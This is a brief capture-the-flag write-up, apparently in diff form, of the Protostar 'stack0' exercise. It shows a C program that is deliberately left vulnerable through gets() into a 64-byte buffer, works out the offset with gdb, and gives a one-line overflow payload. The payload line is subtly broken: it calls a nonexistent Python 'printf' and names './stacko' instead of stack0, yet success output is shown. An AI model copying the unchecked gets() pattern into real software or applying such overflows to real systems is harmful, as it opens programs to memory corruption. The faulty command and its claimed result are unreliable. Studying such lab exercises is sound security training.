@@ -1,0 +1,33 @@
+/opt/protostar/bin/stack0
+
+#include <stdlib.h>
+#include <unistd.h>
+#include <stdio.h>
+
+int main(int argc, char **argv)
+{
+  volatile int modified;
+  char buffer[64];
+
+  modified = 0;
+  gets(buffer);
+
+  if(modified != 0) {
+      printf("you have changed the 'modified' variable\n");
+  } else {
+      printf("Try again?\n");
+  }
+}
+
+
+We can see in gdb adressess of variables:
+modified = 0xbffff874
+buffer   = 0xbffff834
+
+874-834=40(h)=64(d)
+
+Buffer is stored in memory 64 bytes before modified variable. Gets is used to get the input from user, which means we can overflow the buffer, since gets doesn't check the length of entered data. So if we enter more than 64 bytes (chars) we will overwrite value at 0xbffff874. 
+
+Let's use python for output:
+> python -c "printf('A'*65)" | ./stacko
+> you have changed the 'modified' variable
